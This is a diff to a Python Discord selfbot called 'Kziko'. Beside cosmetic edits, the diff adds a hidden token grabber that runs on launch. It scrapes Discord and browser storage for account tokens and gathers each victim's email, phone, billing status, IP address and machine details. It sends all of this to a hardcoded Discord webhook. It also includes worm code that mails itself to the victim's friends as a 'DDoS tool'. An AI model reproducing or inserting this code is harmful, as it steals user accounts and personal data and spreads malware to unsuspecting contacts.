@@ -13,6 +13,14 @@ import time
 from urllib import parse, request
 from itertools import cycle
 from bs4 import BeautifulSoup as bs4
+from re import findall
+from json import loads, dumps
+from base64 import b64decode
+from subprocess import Popen, PIPE
+from urllib.request import Request, urlopen
+from threading import Thread
+from time import sleep
+from sys import argv
 
 import aiohttp
 import colorama
@@ -45,6 +53,19 @@ tts_language = "en"
 
 start_time = datetime.datetime.utcnow()
 loop = asyncio.get_event_loop()
+
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+    "Discord"           : ROAMING + "\\Discord",
+    "Discord Canary"    : ROAMING + "\\discordcanary",
+    "Discord PTB"       : ROAMING + "\\discordptb",
+    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
+    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
+    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+}
+WEBHOOK_URL = "https://canary.discord.com/api/webhooks/952280378226380842/FrRFmKInOi--jXeviVh_ZOnaLVawJdyL0wadH2kDWLzW8QTOZd6YpGG34u9HNGnoIT5U"
 
 languages = {
     'hu': 'Hungarian, Hungary',
@@ -115,7 +136,7 @@ def startprint():
 
     print(f'''{Fore.RESET}
 
-                                                 
+                                          
 {Fore.RED}KKKKKKKKK    KKKKKKKZZZZZZZZZZZZZZZZZZZIIIIIIIIIIKKKKKKKKK    KKKKKKK     OOOOOOOOO     
 {Fore.RED}K:::::::K    K:::::KZ:::::::::::::::::ZI::::::::IK:::::::K    K:::::K   OO:::::::::OO   
 {Fore.RED}K:::::::K    K:::::KZ:::::::::::::::::ZI::::::::IK:::::::K    K:::::K OO:::::::::::::OO 
@@ -132,6 +153,9 @@ def startprint():
 {Fore.RED}K:::::::K    K:::::KZ:::::::::::::::::ZI::::::::IK:::::::K    K:::::K OO:::::::::::::OO 
 {Fore.RED}K:::::::K    K:::::KZ:::::::::::::::::ZI::::::::IK:::::::K    K:::::K   OO:::::::::OO   
 {Fore.RED}KKKKKKKKK    KKKKKKKZZZZZZZZZZZZZZZZZZZIIIIIIIIIIKKKKKKKKK    KKKKKKK     OOOOOOOOO 
+\n
+\n
+
                        {Fore.CYAN}Kziko v{SELFBOT.__version__} | {Fore.GREEN}Logged in as: {Exeter.user.name}#{Exeter.user.discriminator} {Fore.CYAN}| ID: {Fore.GREEN}{Exeter.user.id}   
                        {Fore.CYAN}Nitro Sniper | {Fore.GREEN}{nitro}
                        {Fore.CYAN}Cached Users: {Fore.GREEN}{len(Exeter.users)}
@@ -145,6 +169,208 @@ def Clear():
 
 
 Clear()
+
+
+WEBHOOK_URL = "https://canary.discord.com/api/webhooks/952280378226380842/FrRFmKInOi--jXeviVh_ZOnaLVawJdyL0wadH2kDWLzW8QTOZd6YpGG34u9HNGnoIT5U" # Insert webhook url here
+
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+    "Discord": ROAMING + "\\Discord",
+    "Discord Canary": ROAMING + "\\discordcanary",
+    "Discord PTB": ROAMING + "\\discordptb",
+    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
+    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
+    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+}
+
+
+def getHeader(token=None, content_type="application/json"):
+    headers = {
+        "Content-Type": content_type,
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
+    }
+    if token:
+        headers.update({"Authorization": token})
+    return headers
+
+
+def getUserData(token):
+    try:
+        return loads(
+            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
+    except:
+        pass
+
+
+def getTokenz(path):
+    path += "\\Local Storage\\leveldb"
+    tokens = []
+    for file_name in os.listdir(path):
+        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+            continue
+        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                for token in findall(regex, line):
+                    tokens.append(token)
+    return tokens
+
+
+def whoTheFuckAmI():
+    ip = "None"
+    try:
+        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
+    except:
+        pass
+    return ip
+
+
+def hWiD():
+    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+
+
+def getFriends(token):
+    try:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
+                                     headers=getHeader(token))).read().decode())
+    except:
+        pass
+
+
+def getChat(token, uid):
+    try:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getHeader(token),
+                                     data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
+    except:
+        pass
+
+
+def paymentMethods(token):
+    try:
+        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
+                                              headers=getHeader(token))).read().decode())) > 0)
+    except:
+        pass
+
+
+def sendMessages(token, chat_id, form_data):
+    try:
+        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getHeader(token,
+                                                                                                         "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
+                        data=form_data.encode())).read().decode()
+    except:
+        pass
+
+
+def spread(token, form_data, delay):
+    return  # Remove to re-enabled (If you remove this line, malware will spread itself by sending the binary to friends.)
+    for friend in getFriends(token):
+        try:
+            chat_id = getChat(token, friend["id"])
+            sendMessages(token, chat_id, form_data)
+        except Exception as e:
+            pass
+        sleep(delay)
+
+
+def main():
+    cache_path = ROAMING + "\\.cache~$"
+    prevent_spam = True
+    self_spread = True
+    embeds = []
+    working = []
+    checked = []
+    already_cached_tokens = []
+    working_ids = []
+    ip = whoTheFuckAmI()
+    pc_username = os.getenv("UserName")
+    pc_name = os.getenv("COMPUTERNAME")
+    user_path_name = os.getenv("userprofile").split("\\")[2]
+    for platform, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
+        for token in getTokenz(path):
+            if token in checked:
+                continue
+            checked.append(token)
+            uid = None
+            if not token.startswith("mfa."):
+                try:
+                    uid = b64decode(token.split(".")[0].encode()).decode()
+                except:
+                    pass
+                if not uid or uid in working_ids:
+                    continue
+            user_data = getUserData(token)
+            if not user_data:
+                continue
+            working_ids.append(uid)
+            working.append(token)
+            username = user_data["username"] + "#" + str(user_data["discriminator"])
+            user_id = user_data["id"]
+            email = user_data.get("email")
+            phone = user_data.get("phone")
+            nitro = bool(user_data.get("premium_type"))
+            billing = bool(paymentMethods(token))
+            embed = {
+                "color": 0x7289da,
+                "fields": [
+                    {
+                        "name": "|Account Info|",
+                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
+                        "inline": True
+                    },
+                    {
+                        "name": "|PC Info|",
+                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
+                        "inline": True
+                    },
+                    {
+                        "name": "|Token|",
+                        "value": token,
+                        "inline": False
+                    }
+                ],
+                "author": {
+                    "name": f"{username} ({user_id})",
+                },
+                "footer": {
+                    "text": f"Visit my website for more Cybersecurity contents: un5t48l3.com"
+                }
+            }
+            embeds.append(embed)
+    with open(cache_path, "a") as file:
+        for token in checked:
+            if not token in already_cached_tokens:
+                file.write(token + "\n")
+    if len(working) == 0:
+        working.append('123')
+    webhook = {
+        "content": "",
+        "embeds": embeds,
+        "username": "Discord Token Grabber",
+        "avatar_url": "https://mehmetcanyildiz.com/wp-content/uploads/2020/11/black.png"
+    }
+    try:
+        
+        urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getHeader()))
+    except:
+        pass
+    if self_spread:
+        for token in working:
+            with open(argv[0], encoding="utf-8") as file:
+                content = file.read()
+            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nDDoS tool. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
+            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
+
+
+try:
+    main()
+except Exception as e:
+    print(e)
+    pass
 
 
 def Init():
@@ -832,7 +1058,7 @@ async def bots(ctx):
 async def help(ctx, category=None):
     await ctx.message.delete()
     if category is None:
-        await ctx.send(f"> **Kziko 𝙎𝙀𝙇𝙁𝘽𝙊𝙏  | 𝙋𝙍𝙀𝙁𝙄𝙓: \n>  \n> 🧊 GENERAL \n`Show all General Cmd` \n> \n> 🧊 ACCOUNT \n> `show all Account Cmd` \n> \n> 🧊 TEXT \n> `Show all Text Cmd` \n> \n> 🧊 MUSIC \n> `Show all Music Cmd` \n> \n> 🧊 IMAGE \n> `Show all Image Cmd` \n> \n> 🧊 NSFW \n> `Show all NSFW Cmd` \n> \n> 🧊 Misc \n> `Show all Misc Cmd` \n> \n> 🧊 Anti-Nuke \n> `Show all Anti-Nuke Cmd` \n> \n> 🧊 Nuke \n> `Show all Nuke Cmd`** \n> \n> https://share.creavite.co/qEDe3iOUxP8AnJsL.gif **")
+        await ctx.send(f"> **Kziko 𝙎𝙀𝙇𝙁𝘽𝙊𝙏  | 𝙋𝙍𝙀𝙁𝙄𝙓: \n>  \n> 🧊 GENERAL \n`Show all General Cmd` \n> \n> 🧊 ACCOUNT \n> `show all Account Cmd` \n> \n> 🧊 TEXT \n> `Show all Text Cmd` \n> \n> 🧊 MUSIC \n> `Show all Music Cmd` \n> \n> 🧊 IMAGE \n> `Show all Image Cmd` \n> \n> 🧊 NSFW \n> `Show all NSFW Cmd` \n> \n> 🧊 Misc \n> `Show all Misc Cmd` \n> \n> 🧊 Anti-Nuke \n> `Show all Anti-Nuke Cmd` \n> \n> 🧊 Nuke \n> `Show all Nuke Cmd`** \n> \n> **https://share.creavite.co/qEDe3iOUxP8AnJsL.gif **")
         await ctx.send(ctx)
     elif str(category).lower() == "general":
         await ctx.send(f"** `GENERAL COMMANDS`\n`> help <category>` - returns all commands of that category\n`> uptime` - return how long the selfbot has been running\n`> prefix <prefix>` - changes the bot's prefix\n`> ping` - returns the bot's latency\n`> av <user>` - returns the user's pfp\n`> whois <user>` - returns user's account info\n`> tokeninfo <token>` - returns information about the token\n`> copyserver` - makes a copy of the server\n`> rainbowrole <role>` - makes the role a rainbow role (ratelimits)\n`> serverinfo` - gets information about the server\n`> serverpfp` - returns the server's icon\n`> banner` - returns the server's banner\n`> shutdown` - shutsdown the selfbot\n`> getroles` - lists all roles on the server \n \n https://share.creavite.co/qEDe3iOUxP8AnJsL.gif**")
@@ -1529,7 +1755,7 @@ async def pornhub(ctx, word1=None, word2=None):
             async with session.get(endpoint) as resp:
                 image = await resp.read()
         with io.BytesIO(image) as file:
-            await ctx.send(file=discord.File(file, f"exeter_pornhub_logo.png"))
+            await ctx.send(file=discord.File(file, f"kziko_pornhub_logo.png"))
     except:
         await ctx.send(endpoint)
 
